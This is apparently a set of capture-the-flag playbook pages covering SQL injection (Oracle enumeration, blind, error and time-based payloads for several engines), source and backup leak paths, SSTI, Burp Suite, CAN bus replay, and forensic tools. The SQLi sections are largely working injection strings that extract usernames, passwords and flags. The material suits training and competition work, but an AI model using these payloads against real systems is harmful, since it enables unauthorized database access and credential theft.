SELECT table_name FROM user_tables ORDER BY table_name; SELECT owner,table_name FROM all_tables ORDER BY owner,table_name;Complete example:
missing' UNION SELECT NULL,table_name,NULL FROM user_tables-- -USER_TABLES shows tables owned by the current user. ALL_TABLES shows accessible tables. Do not assume access to DBA catalog views.
3. Enumerate columns Ordinary unquoted identifiers are stored uppercase:
SELECT column_name,data_type FROM user_tab_columns WHERE table_name='USERS' ORDER BY column_id; SELECT owner,column_name,data_type FROM all_tab_columns WHERE owner='APP' AND table_name='USERS' ORDER BY column_id;missing' UNION SELECT NULL,column_name||':'||data_type,NULL FROM user_tab_columns WHERE table_name='USERS'-- -Quoted identifiers keep their declared case. If the catalog says SecretFlags, quote it exactly: "SecretFlags".
4. Read data SELECT USERNAME,PASSWORD FROM USERS; SELECT FLAG FROM FLAGS; SELECT TO_CHAR(ID)||':'||USERNAME||':'||NVL(PASSWORD,'<NULL>') FROM USERS;missing' UNION SELECT NULL,USERNAME||':'||PASSWORD,NULL FROM USERS-- -Oracle uses || for concatenation and TO_CHAR() for explicit conversion. Empty strings are treated as NULL in ordinary character data, which can affect conditions and markers.
One row at a time on Oracle 12c+:
SELECT FLAG FROM FLAGS ORDER BY ID OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;Older version:
SELECT FLAG FROM (SELECT FLAG FROM FLAGS ORDER BY ID) WHERE ROWNUM=1;Aggregate shorter text where supported and within output size limits:
SELECT LISTAGG(TABLE_NAME,',') WITHIN GROUP (ORDER BY TABLE_NAME) FROM USER_TABLES;LISTAGG can overflow; individual rows avoid that. CLOBs may need DBMS_LOB.SUBSTR(FLAG,2000,1) before rendering in a text column; privileges and UNION compatibility still apply.
5. Blind predicates LENGTH(USER)>5 ASCII(SUBSTR(USER,1,1))>109 EXISTS(SELECT 1 FROM USER_TABLES WHERE TABLE_NAME='FLAGS') ASCII(SUBSTR((SELECT FLAG FROM FLAGS WHERE ROWNUM=1),1,1))>109To read a stable row, prefer an exact unique key. ROWNUM=1 without ordered nesting may select an unpredictable row.
6. Conditional error An expression like this may provide an error oracle if the server exposes different responses:
1 AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'ok' END FROM dual)='ok' 1 AND (SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'ok' END FROM dual)='ok'Keep CASE branch types compatible. Oracle’s behavior here differs from SQLite’s NULL result for division by zero. Test both controls repeatedly before extracting data.
Time and stacked queries Do not paste MySQL SLEEP or SQL Server WAITFOR into an Oracle expression. Delay packages have execution grants and invocation-context requirements. Many Oracle application APIs execute one statement and do not accept an arbitrary stacked batch. Use the boolean/error oracle already established instead of assuming package access.
Official references: ALL_TAB_COLUMNS, USER_TABLES, SQL Language Reference.

title: pdftotext (Poppler utils)
content:
Use for: extracting searchable PDF text and preserving reading layout.
Run in: WSL; Poppler utilities.
Quick commands pdftotext -v # Check the installed Poppler version pdftotext document.pdf output.txt # Extract normal reading-order text pdftotext -layout document.pdf output_layout.txt # Preserve approximate columns pdftotext document.pdf - # Print text directly to the terminal pdftotext -f 2 -l 4 document.pdf pages_2_to_4.txt # Restrict extraction to pages 2–4 pdftotext -enc UTF-8 document.pdf output_utf8.txt # Request a specific output encoding- sends output to stdout. Page numbers start at 1.
Walkthrough: search a document pdftotext -layout challenge.pdf extracted.txt grep -niE 'flag|secret|password|https?://' extracted.txt # Compare reading order if columns or spacing are confusing pdftotext challenge.pdf extracted_default.txtRead the matching page in a PDF viewer to connect extracted text with the visual context.
Password supplied by challenge pdftotext -upw 'supplied-password' challenge.pdf output.txtGotchas A scanned page may have no text layer. pdftotext does not perform OCR. Custom font encodings can make extraction incomplete or scrambled. Hidden text may differ from what the viewer displays. Embedded attachments need qpdf or a viewer’s attachment panel. Flags explained Flag Meaning -v Print the version -layout Preserve approximate physical spacing/columns -f N Start at page N, using one-based numbering -l N Stop at page N -enc UTF-8 Choose output text encoding -upw PASSWORD Supply a known PDF user password -bbox-layout Emit word bounding boxes with layout information -nopgbrk Omit form-feed page separators - as output filename Write extracted text to standard output The first positional filename is the PDF; the second is the output. -l means last page here, unlike tools where it means length or list.
CTF: compare rendered order with reading order pdftotext challenge.pdf reading_order.txt pdftotext -layout challenge.pdf physical_layout.txt diff -u reading_order.txt physical_layout.txtRead differences alongside the displayed page. A multi-column page, positioned letters or off-page words can change the result of simple extraction.
CTF: locate words by coordinates pdftotext -bbox-layout challenge.pdf word_positions.htmlOpen the generated structured output as text to inspect word coordinates. Coordinates help relate extracted words to visible positions; they do not automatically prove hidden content or reading order.
CTF: inspect page separators and invisible characters pdftotext -enc UTF-8 challenge.pdf extracted.txt xxd -l 256 extracted.txt # A second export without PDF page-break characters pdftotext -nopgbrk challenge.pdf without_page_breaks.txtIf a regex fails across pages, check form-feed bytes, nonbreaking spaces and unusual Unicode characters before assuming the word is absent.
Follow the evidence to another tool Extraction result Next move No selectable text PDF Viewer and visual inspection Attachment filename mentioned qpdf attachment listing/export Encoded string CyberChef/Python, preserving exact characters Text differs from visible content qpdf objects and word positions Password required Use the challenge-provided password; inspect encryption with qpdf Reference: Poppler pdftotext manual source.
Related playbooks PDF and document analysis

title: 07 · SQLi — Blind / Error
content:
Blind and Error-Based SQLi Blind SQLi means no direct data output. You still need a reliable oracle. A change in row visibility, message, HTTP status, exception, or response time can answer one yes/no question per probe.
1. Establish the oracle before extracting Choose a known existing ID and preserve the original request/session:
1 AND 1=1 1 AND 1=2For a quoted value:
apple' AND 1=1-- - apple' AND 1=2-- -Repeat baseline → true → false → true. Define the exact observable result:
TRUE = response JSON contains product id 1 FALSE = response JSON has an empty products array ERROR = backend syntax error / separate statusDo not classify every non-TRUE response as FALSE. CSRF failures, connection timeouts, rate limits, generic errors, and expired cookies are separate outcomes.
2. Pick the scalar expression Engine Example target expression Character code at position 1 MySQL (SELECT flag FROM flags ORDER BY id LIMIT 1) ASCII(SUBSTRING(EXPR,1,1)) PostgreSQL (SELECT flag FROM public.flags ORDER BY id LIMIT 1) ascii(substring(EXPR,1,1)) SQLite (SELECT flag FROM flags ORDER BY id LIMIT 1) unicode(substr(EXPR,1,1)) SQL Server (SELECT TOP 1 flag FROM dbo.flags ORDER BY id) ASCII(SUBSTRING(EXPR,1,1)) Oracle (SELECT FLAG FROM FLAGS WHERE ID=1) ASCII(SUBSTR(EXPR,1,1)) EXPR is notation; replace it with the actual scalar expression, including parentheses. Enumerate table/column names with engine catalogs if unknown. Confirm the row exists before comparing a NULL result.
3. Extract length first MySQL example, numeric injection:
1 AND LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>16 1 AND LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>32 1 AND LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>24If >16 is true, >32 false, and >24 true, the length is in 25–32. Keep splitting that interval. Verify the final candidate with =N.
SQL Server uses LEN (trailing spaces ignored); engines differ on byte versus character length. For ASCII CTF flags this is usually simple; use hex if the representation is uncertain.
4. Extract each character manually Example first-character ASCII binary search:
1 AND ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>79 1 AND ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>103 1 AND ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>91Use the previous answer to choose the next threshold. For printable ASCII, start with an appropriate interval such as 32–126, then verify equality. Characters outside that range require a broader range / hex strategy.
Answer to code > midpoint New interval TRUE midpoint+1 through current upper bound FALSE, with a valid normal response Current lower bound through midpoint Transport / backend error Repeat or repair the request; do not update bounds After confirming position 1, change the position to 2, then 3. Offsets are 1-indexed in the listed substring functions.
Final verification:
1 AND (SELECT flag FROM flags ORDER BY id LIMIT 1)='flag{recovered_value}'Case-insensitive collations can make string equality ambiguous; compare character codes / binary or hex values if case matters.
5. Enumerate schema with the same method First answer existence, then count, then read one ordered item:
1 AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='flags') 1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())>3 1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>109Those examples are MySQL. Use the catalog and pagination in the matching engine guide. Never assume the same table order between unqualified requests.
6. Error-based routes Detailed conversion errors -- PostgreSQL, numeric context 1 AND CAST((SELECT current_database()) AS integer)=1 -- SQL Server, numeric context 1 AND CONVERT(int,DB_NAME())=1If exception text includes the converted value, it is direct disclosure. If only error/no-error changes, make the conversion conditional using engine-specific syntax and treat it as a boolean oracle. PostgreSQL planners can evaluate constant invalid expressions early; a paired test is essential.
Oracle conditional error 1 AND (SELECT CASE WHEN LENGTH(USER)>5 THEN TO_CHAR(1/0) ELSE 'ok' END FROM dual)='ok'SQLite conditional error 1 AND CASE WHEN length(sqlite_version())>5 THEN abs(-9223372036854775808) ELSE 1 END=1SQLite division by zero is not a dependable exception. MySQL legacy XML function errors are version-dependent; verify function availability before choosing that route.
7. Time-based routes Engine Conditional timing pattern Prerequisite MySQL 1 AND IF(CONDITION,SLEEP(2),0)=0 Expression executed; beware once-per-row evaluation PostgreSQL 1 AND (SELECT 1 FROM pg_sleep(CASE WHEN CONDITION THEN 2 ELSE 0 END))=1 Scalar subquery executes SQL Server 1'; IF (CONDITION) WAITFOR DELAY '00:00:02'-- - Driver accepts this batch SQLite No standard sleep function Prefer boolean/error oracle Oracle No general scalar sleep payload here Package grants/context differ; prefer existing oracle Replace CONDITION, not the whole surrounding request. First test constant true/false with a short delay and a stable baseline. Then insert the extraction predicate.
baseline, false, true, false, true compare server response time across several repeats if transport timeout → unknown, not automatically TRUETiming can be distorted by connection setup, jitter, queued work, caching, and retries. Keep requests sequential for manual calibration. Avoid heavy-query tricks that burden the service when a short sleep or boolean difference is available.
8. Final checklist Correct database, schema, stable row, and scalar result? Correct string quote / parenthesis / comment closure? Distinguishing NULL, empty string, false, and an exception? Stable cookies, CSRF token, route, content type, and no cache masking? Recovered length and final full equality both confirmed? Reference: PortSwigger blind SQLi. Engine-specific official references are linked from each database page.

title: can-utils
content:
Use for: CAN bus capture, payload inspection and replay in automotive CTFs.
Run in: WSL with SocketCAN support. can0 is a real interface; vcan0 is a virtual interface.
Prepare a virtual practice bus # Requires kernel vcan support and permission to create interfaces sudo modprobe vcan sudo ip link add dev vcan0 type vcan sudo ip link set dev vcan0 up ip -details link show vcan0If modprobe or interface creation fails, the provided WSL kernel may lack support. Use the organizer’s supplied CAN setup.
Read frames # Terminal 1: watch timestamped frames candump -tz vcan0 # Save frames in canplayer-compatible log format candump -L vcan0 > capture.log # Show only standard CAN ID 0x123 candump 'vcan0,123:7FF'Send one known frame # Terminal 2: ID 0x123, four payload bytes cansend vcan0 123#11223344Classic CAN uses up to eight payload bytes. Decode the challenge protocol before assigning meaning to an ID or changing bytes.
Replay a captured log # For a log already recorded on vcan0 canplayer -I capture.log # Map a log's can0 frames onto local vcan0 canplayer -I capture.log vcan0=can0CTF workflow Capture a baseline → perform one action → compare IDs and changing payload bytes → replay the relevant frames → watch the challenge’s resulting state. A transmitted frame alone does not prove the objective completed.
Flags explained by utility Command / option Meaning candump -t z or -tz Show timestamps relative to the beginning of this capture candump -L Print canplayer-compatible log records to stdout candump -l Write an automatically named log file candump -n 100 Stop after 100 received frames candump -x Print extra message information, including direction where available canplayer -I FILE Read replay data from a log file canplayer -g MS Configure its replay gap setting; check installed help for timing behavior cansend IFACE FRAME Send one encoded frame; interface/frame are positional arguments -L and -l are different. Options belong to the named utility, not the can-utils collection as a whole.
Read a CAN frame vcan0 123 [4] 11 22 33 44 │ │ └─ four data bytes │ └────── payload length └──────────── hexadecimal CAN identifierThe identifier can describe an arbitration ID rather than a command number. Application semantics must come from the challenge protocol, code or observed behavior.
CTF: observe a controlled action # Record a bounded sample before changing any challenge state candump -L -n 100 vcan0 > baseline.log # In a separate run, perform one known action while capturing candump -L -n 100 vcan0 > action.logCompare message rates and changed bytes. A periodic counter/checksum can change independently of the action.
CTF: compare values for one CAN ID # Filter standard ID 0x123; mask 0x7FF covers its 11 ID bits candump -L -n 50 'vcan0,123:7FF' > id123.logFor extended IDs and exact frame-flag filtering, inspect candump’s filter syntax rather than reusing an 11-bit mask blindly.
CTF: decode a possible little-endian sensor value payload = bytes.fromhex("34120000") raw = int.from_bytes(payload[:2], "little") print(raw) # 4660 print(raw * 0.1) # Example scale onlyThe 0.1 scaling factor is an example, not an inferred protocol rule. Confirm signedness, scaling, counters and checksums against known states.
CTF: replay only after understanding the state If a supplied log is known to solve the challenge, replay that unchanged first. Otherwise identify required mode/session/setup actions and preserve their order. Continue watching status frames after transmission until the objective is confirmed.
Diagnose an empty capture ip -details -statistics link show vcan0 candump -h canplayer -hCheck interface existence/up state, tunnel routing, chosen ID filter and whether the remote actually emits traffic. A CAN interface can be up while a tunnel is disconnected.
References: can-utils, candump options, canplayer options.
Related playbooks CAN bus state and replay

title: 08 · Source / Backup Leaks
content:
Source, Backup, and Debug Leaks Start here before injection. A leaked route, schema, secret, or source map can turn guessing into a direct source audit.
1. Compare against a nonexistent path Request a deliberately nonexistent path first. Some applications return the same SPA shell or login page for everything. A 200 alone does not establish that a backup exists.
Check challenge-indicated names and linked resources:
/robots.txt /sitemap.xml /.well-known/security.txt /app.js /app.js.map /static/js/main.js.map /.git/HEAD /.git/config /index.php.bak /index.php~ /.index.php.swp /backup.zip /sourceDo not assume every listed path is present. Follow actual asset names, comments, source map annotations, and error paths rather than trying arbitrary filenames indefinitely.
2. Interpret the response Evidence Meaning Next action ref: refs/heads/... from .git/HEAD Exposed Git metadata Check accessible refs/objects; source may be recoverable [core] / [remote ...] config Git config disclosure Inspect relevant repo hints; don’t assume object listing Source text instead of executed PHP Backup or source delivery Trace request inputs to sinks Source map JSON sources, sourcesContent Browser source reconstruction Read routes, hidden fields, API URLs PK / application/zip Possible ZIP Verify magic and list archive before interpreting Debug stack trace Code paths and component versions Identify exact handler, query, template, environment Same HTML as random path Catch-all / fallback Not confirmed disclosure Git packfiles, loose objects, refs, and ignored/untracked files are different. Exposed .git/HEAD does not guarantee every source file is downloadable, and downloading a working tree does not prove access to deleted commits.
3. Audit recovered source routes → input names → validators → transformations → sink database init → table names → seed rows → hidden predicates Dockerfile → working directory → flag path → service user templates → escaped vs raw output → second render auth → server session vs client claims → object ownershipRead dependency lockfiles for exact versions. A version string suggests research, not a proven vulnerability. Inspect configuration and reachable code paths before applying a known payload.
4. Debug pages Component Things worth reading What not to assume Flask / Werkzeug Stack frame locals, source lines, app paths Debug console is not automatically unlocked Django Routes, settings names, error SQL DEBUG does not guarantee arbitrary code execution PHP Include paths, warning source locations A warning is not necessarily a file read Node Stack paths, source files, package names SyntaxError is not itself a NoSQL fingerprint Java Class names, template engine, binding errors Expression evaluation depends on the exact sink 5. Map to tools Chrome: DevTools Sources/Network and pretty printing. Burp: replay source/backup requests and compare responses. jq: inspect source map JSON. strings: quick inspection of recovered files. Next: SQLi · SSTI · PHP quirks · Auth
Reference: PortSwigger information disclosure.

title: cannelloni
content:
Use for: tunneling CAN frames over an IP network into a local SocketCAN interface.
Run in: WSL with a working CAN/vcan interface. Use with can-utils.
Check the supplied build cannelloni -h ip -details link show vcan0Connect to a challenge CAN endpoint # Example values only: replace IP and both ports with organizer values cannelloni -I vcan0 -R 192.0.2.10 -r 20000 -l 20001 Option Purpose -I vcan0 Local CAN interface -R ADDRESS Remote IP address -r PORT Remote destination port -l PORT Local listening port -d cut CAN, UDP and timer debugging The remote endpoint must send back to your chosen local port. Match the supplied transport and addressing.
Observe the tunneled traffic # Second terminal; keep cannelloni running candump -tz vcan0 candump -L vcan0 > challenge_can.logTCP mode when explicitly supplied # Build must support this option; use the challenge's remote port cannelloni -I vcan0 -C c -R 192.0.2.10 -r 20000Gotchas UDP can lose or reorder frames. VPN routes, firewall rules and WSL networking can prevent return traffic. No frames? Check the CAN interface, protocol and ports before editing payloads. Cannelloni carries frames; it does not decode application command meanings. Additional options explained Option Meaning -I IFACE Use this local SocketCAN interface -R IP Set the remote peer address -r PORT Send to the peer’s listening port -l PORT Bind the local receiving port -C c / -C s TCP client / server mode, if supported -S c / -S s SCTP client / server mode, if supported -d cut Debug categories: CAN, UDP and timers -t N Aggregation timeout in microseconds for supported transports Uppercase -I is the interface; lowercase -l is the local port. TCP/SCTP support and switches depend on the supplied build.
CTF: reason about two endpoints Your WSL side: local port 20001, remote port 20000 Challenge side: local port 20000, remote port 20001Each peer’s destination must match the other peer’s actual reachable listening port. NAT/VPN/WSL forwarding can change what the remote can reach; use the organizer’s addressing instructions.
CTF: bring up and inspect a local tunnel # Terminal 1: keep running for the full challenge session cannelloni -I vcan0 -R 192.0.2.10 -r 20000 -l 20001 -d cut # Terminal 2: observe CAN messages delivered through that tunnel candump -tz vcan0Do not stop the tunnel after the first frame or ACK. Stateful devices can emit success/status messages later.
Capture only after the tunnel is ready candump -L vcan0 > tunneled_capture.logKeep the capture running during one known interaction. Note its start time and the exact action, then examine changes in the relevant IDs.
Failure decision table Observation Likely area to investigate No vcan0 Kernel/interface setup Peer connection cannot be established VPN route, transport and endpoint Outgoing traffic, no return frames Return address/port, NAT or remote state Local CAN frames but no objective change Application semantics/setup/checksum Intermittent missing responses UDP loss, timing or rate mismatch TCP option rejected Different version/build capabilities Preserve the protocol sequence Record the command’s documented meaning, required mode/state, payload format and expected reply. Transport success means frames moved; challenge success must be established by its own state/output.
Reference: upstream usage and transports. The tournament list points to a fork; use the installed build’s help if options differ.
Related playbooks CAN tunnel workflow

title: Zeek
content:
Use for: turning PCAP traffic into connection, DNS, HTTP and TLS logs.
Run in: WSL.
Generate logs from a capture # Logs are written into the current directory mkdir -p zeek_out cd zeek_out zeek -r ../traffic.pcap ls -lhIf checksum offloading prevents useful analysis, retry in a fresh output folder with zeek -C -r ../traffic.pcap. -C ignores checksum validation.
Pick the useful log File CTF use conn.log Who talked to whom, ports, timing and byte counts dns.log Queried domains and answers http.log Hosts, URIs, methods and status codes ssl.log TLS handshake metadata, when observed files.log Files observed by analyzers; not automatic file extraction weird.log Protocol anomalies Extract columns from default TSV logs zeek-cut id.orig_h id.resp_h service < conn.log zeek-cut query answers < dns.log zeek-cut host uri < http.logGenerate JSON logs for jq # Run separately from the TSV example mkdir -p ../zeek_json cd ../zeek_json zeek -r ../traffic.pcap LogAscii::use_json=T jq -r '[.host, .uri] | @tsv' http.logGotchas Only observed protocols generate their associated logs. TLS application content remains encrypted without appropriate decryption elsewhere. Reuse the Zeek connection uid to correlate records across logs. Flags and log settings Syntax Meaning -r FILE Read offline traffic from a PCAP -i INTERFACE Capture live traffic; appropriate privileges required -C Ignore checksum validation LogAscii::use_json=T Write JSON records instead of normal TSV logs zeek-cut FIELD... Select named columns from Zeek TSV logs -r reads an input capture; generated logs are written in your current working directory. Use a fresh directory for every run.
CTF: correlate an HTTP request with its connection # Default TSV logs: retain the uid that joins protocol records zeek-cut uid id.orig_h id.resp_h service < conn.log > connections.tsv zeek-cut uid host uri status_code < http.log > requests.tsv grep 'REPLACE_WITH_UID' connections.tsv requests.tsvThe same connection UID connects an HTTP record to its transport metadata. A host or IP can appear in many unrelated sessions.
CTF: identify unusual DNS labels in JSON output # Sort domain observations by query length jq -s 'sort_by(.query | length) | reverse | .[:20] | .[] | {ts, query, answers}' dns.logLong names are candidates, not proof of tunneling. Check the suffix, encoding alphabet, sequence structure and repetition in the original capture.
CTF: find large outgoing connections # JSON output; missing byte counts are treated as zero jq -s 'sort_by(.orig_bytes // 0) | reverse | .[:10] | .[] | {uid, orig: .["id.orig_h"], resp: .["id.resp_h"], orig_bytes, resp_bytes, service}' conn.logZeek JSON uses dotted keys such as id.orig_h; jq must address these with bracket access such as .["id.orig_h"], as shown above. .id.orig_h instead looks for nested objects.
CTF: search observed file metadata jq -c '{fuid, mime_type, filename, seen_bytes, total_bytes}' files.logA files.log entry records analyzer observations. Missing filename/length fields are normal for some protocols. Recovery still requires the original capture or a separately configured extraction policy.
Interpret connection state carefully Large byte counts, uncommon services and brief connections help prioritize. Combine direction, endpoints, time window and application evidence. Do not label a transfer as exfiltration from volume alone.
References: Zeek quick start, log reference.
Related playbooks Packet triage Protocol analysis DNS reconstruction

title: ZBar
content:
Use for: decoding QR codes and supported barcodes from images.
Run in: WSL; the image CLI is zbarimg.
Decode a QR image # Shows barcode type plus decoded value zbarimg code.png # Write only the decoded payload zbarimg --quiet --raw code.png > decoded.txtScan several images # Normal output retains image/scan context better than raw payload alone zbarimg *.png # Raw output for a known single image zbarimg --raw frame_001.pngCTF walkthrough Save the original QR/barcode image. Run zbarimg and keep the decoded value. Check whether it is a URL, Base64, hex, or plain text. Continue in CyberChef or Python if another encoding is present. If it does not decode Check whether the whole code and its surrounding quiet border are visible. Try a clearer supplied frame or image when available. A stylized, damaged or incomplete code may need reconstruction first. No result does not prove the image contains no hidden data; use zsteg/binwalk for other image clues. Check the installed build’s supported formats and options with zbarimg --help.
Flags explained Flag Meaning --raw Emit decoded data without normal barcode-type formatting --quiet Reduce normal status/summary output --help Print supported options for the installed build --raw changes output formatting; it does not reconstruct a damaged barcode or guarantee arbitrary binary payloads survive a text pipeline.
CTF: keep decoded values associated with filenames mkdir -p qr_results for image in frames/*.png; do printf '\nFILE: %s\n' "$image" zbarimg "$image" done > qr_results/scans.txt 2> qr_results/errors.txtThis helps when each frame contains one part of a message. Keep decode errors separately so you can revisit unreadable frames.
CTF: assemble ordered fragments If each code contains a sequence index such as 03:PAYLOAD, parse that index and sort numerically. Do not sort the payload text itself. Deduplicate only when both the index and contents agree.
parts = ["02:demo}", "01:flag{"] # Example decoded records records = {} for part in parts: index, payload = part.split(":", 1) number = int(index) if number in records and records[number] != payload: raise ValueError("conflicting fragment") records[number] = payload print("".join(records[i] for i in sorted(records)))Check for missing sequence numbers before submitting the result.
CTF: separate visible QR data from image steganography A valid QR can decode to a hint while the PNG itself contains another payload. Record the QR result, then inspect original metadata, appended data and bit planes if the clue indicates another layer.
Interpret common outcomes Result Meaning Valid URL Treat as a clue and follow competition scope Base64/hex-looking text Preserve exact payload and decode separately Many repeated identical reads Same visible code across frames No decode Visibility, contrast, geometry, supported symbology or damage Reference: ZBar upstream project.
Related playbooks Image/QR inspection

title: Burp Suite Community Edition
content:
Use for: intercepting HTTP, editing requests and comparing responses.
Run in: WSL GUI according to the supplied list; needs a working display.
Listed version: 2026.4.x; verify the competition build under Help/About.
Launch the supplied application # If the installation provides a launcher on PATH burpsuite # Alternative only when the organizer supplies a JAR and Java java -jar /path/to/burpsuite_community.jarWalkthrough: modify a request Start a temporary project with default settings. Proxy → Intercept → Open browser uses Burp’s configured browser. Browse to the assigned challenge. Find the request in Proxy → HTTP history. Right click → Send to Repeater. In Repeater, send the unchanged request to establish a baseline. Change one parameter; compare status, response length and body. Useful tools Tool Use Repeater Manually replay and edit requests Decoder Convert URL/Base64/hex representations Comparer Spot differences between responses Intruder Small controlled payload sets; Community has restrictions HTTP history Recover actual cookies, headers and request bodies Gotchas Leave Intercept off when ordinary browsing appears stuck. Repeater needs the correct target host, port and HTTPS setting. CSRF tokens and session cookies can expire. Windows Chrome talking to a WSL proxy may need additional routing/proxy setup; prefer the configured Burp browser when available. Community does not include the Professional automated scanner. Follow the tournament’s ban on AI related additions. Read an HTTP request before editing it POST /api/item HTTP/1.1 Host: challenge.example Content-Type: application/json Cookie: session=REPLACE {"id":7}The method/path chooses the action, Host chooses the virtual host, the cookie identifies the session, and Content-Type tells the server how to parse the body. Keep a baseline before editing any of them.
CTF: compare an authorization boundary Obtain two accounts/resources that belong to you in the challenge. Capture account A requesting its own item. Send the request to Repeater and confirm the unchanged response. Change only the item ID to account B’s known item. Compare authorization status and returned ownership fields. Repeat the control request to rule out logout/token expiry. A 200 can contain an error wrapper; verify actual protected content or state. Keep both requests and responses as evidence.
CTF: test server-side validation Use Repeater to remove one optional-looking field, change a number into a string, or change a client-controlled value. Inspect the server’s handling rather than relying on disabled UI controls. For JSON, maintain valid syntax so a parser error is not confused with application behavior.
CTF: examine an upload Capture one valid upload and identify the multipart boundary, field names, filename and content type. Change one property at a time on a working request. Preserve the boundary and let Burp update the body length. An upload response is separate from successful retrieval or processing of the uploaded bytes.
CTF: encoded values and duplicate parameters Use Decoder to inspect URL/Base64 representations before altering a token. %2f is encoded text for /; double encoding introduces a second layer. If testing duplicate parameters, record whether the application selects the first, last, or multiple values; do not assume a framework’s behavior.
Cookies, CSRF and redirects Symptom Check Browser works, Repeater fails Fresh cookie/CSRF token, origin/referer, target host 302 response Destination and Set-Cookie; inspect before following Redirect loop Scheme, cookie path/domain and authentication state Request waits forever Intercept state, network route and service liveness Edited body rejected immediately Content-Type, valid syntax and required fields Small Intruder experiments Choose a short list of evidence-based candidate values, mark only the intended position, and compare response content/length. Community throttling can make large brute-force runs impractical. Use Repeater for decisions that require seeing every response.
Launcher syntax explained java -jar FILE.jar asks Java to launch the application packaged in that JAR. -jar is a Java switch, not a Burp scanning option. The burpsuite launcher may be a distribution wrapper; inspect its supplied help if needed. These notes use the GUI for testing.
References: PortSwigger getting started, Repeater documentation.
Related playbooks Web payload index Encoding and filters WebSockets

title: Images: LSB & Bit Planes
content:
Lossless image LSB and bit planes Determine the decoded image mode first. RGB samples, RGBA alpha, grayscale values and palette indices are different carriers.
1. Inspect before extraction exiftool -a -u -g1 image.png zsteg image.pngIf Pillow is already installed and allowed:
from PIL import Image with Image.open("image.png") as im: print(im.format, im.mode, im.size, getattr(im, "n_frames", 1)) print("bands:", im.getbands(), "metadata keys:", sorted(im.info)) Mode What the helper reads RGB Red, green, blue 8-bit sample values RGBA RGB plus independent alpha values L Grayscale sample (--channels l) P Palette indices (--channels i), not converted RGB values 16-bit / floating / other Helper rejects; inspect sample depth before a separate explicit conversion Palette-to-RGB conversion can destroy an index-based message. Converting RGBA to RGB discards alpha. Read Pillow mode concepts before making conversions.
2. zsteg: finding → exact extraction zsteg -a image.png > zsteg-results.txt 2>&1 zsteg -E 'b1,rgb,lsb,xy' image.png > extracted.bin xxd -l 64 extracted.bin strings -a extracted.binThe selector above is an example. Copy the exact selector from your result. A broad scan produces false positives; extraction plus a valid message/container is the proof. Options can differ across installed builds: consult zsteg --help. See the upstream zsteg usage.
3. Manual bitstream extraction Download image_lsb.py. It requires optional Pillow, never modifies the source and refuses to overwrite existing outputs.
python3 image_lsb.py image.png red.bin --channels r --bit 0 --bytes 128 python3 image_lsb.py image.png rgb.bin --channels rgb --bit 0 --bytes 128 python3 image_lsb.py image.png bgr.bin --channels bgr --bit 0 --bytes 128 python3 image_lsb.py image.png alpha.bin --channels a --bit 0 --bytes 128rgb means R bit, G bit, B bit from pixel 0, followed by the same from pixel 1. It does not mean all red pixels followed by all green pixels.
4. Explicit interpretation settings Switch Meaning --bit 0 Extract each sample’s bit zero, the least significant bit --bit 1 Extract sample bit one; not “two bits per sample” --order row Left-to-right within each row, then top-to-bottom --order column Top-to-bottom within each column, then left-to-right --pack msb First collected bit becomes output byte bit seven --pack lsb First collected bit becomes output byte bit zero --skip-bits 3 Discard the first three collected carrier bits before byte packing --bytes 64 Stop at 64 complete output bytes --frame 2 Select frame index two, if the format has it The helper’s terminology is explicit and is not a promise of exact equivalence to every zsteg selector. zsteg may also support sample bit patterns, multiple bits/sample and other traversals.
python3 image_lsb.py image.png shifted.bin --channels rgb --skip-bits 3 --bytes 128 python3 image_lsb.py image.png reversed.bin --channels rgb --pack lsb --bytes 128 python3 image_lsb.py image.png column.bin --channels rgb --order column --bytes 1285. Visual bit-plane extraction python3 image_lsb.py image.png red-plane0.png --channels r --bit 0 --plane python3 image_lsb.py image.png alpha-plane0.png --channels a --bit 0 --planeBit zero becomes black/white values in a new lossless PNG. A hidden QR or text may become visually obvious even when the same bits do not form byte-aligned text. Decode an extracted QR using ZBar:
zbarimg --quiet --raw red-plane0.pngIf necessary, make an explicit inverted/cropped working copy with permitted image tooling. Keep the quiet border around QR symbols. A failed QR decode does not disprove a visible symbol.
6. Capacity and controls For width W, height H, C selected channels and one bit/sample:
capacity_bits = W × H × C capacity_bytes = floor((capacity_bits - skipped_bits) / 8)Change one setting at a time. A real payload generally becomes coherent under a specific combination; random output that contains one short word is weak evidence. Check magic bytes, plausible length fields, decompression success and checksums.
Troubleshooting Symptom What to inspect All alpha bits equal Alpha may be uniformly opaque; try RGB with evidence Plausible prefix, later noise Wrong length, padding, changing channel layout or another encoding Every channel is random Revisit metadata/trailer; carrier may not use pixel LSB Wrong after re-save Original bits may have been changed; return to original JPEG extraction looks random JPEG coefficient methods need a different representation Script reports existing output Choose a new name; it intentionally refuses overwrites Next: PNG/JPEG structures, compressed payloads, downloadable scripts.

title: SSTI · Identify the Engine First
content:
Server-side template injection Order: raw-response evaluation → engine-specific syntax → context objects → file/data access → command execution only if needed. A reflected 49 identifies expression evaluation, not a particular engine and not command execution.
1. First requests Find greetings, custom email templates, PDF previews, error messages, product descriptions and editable themes. Save the normal response before sending one probe at a time.
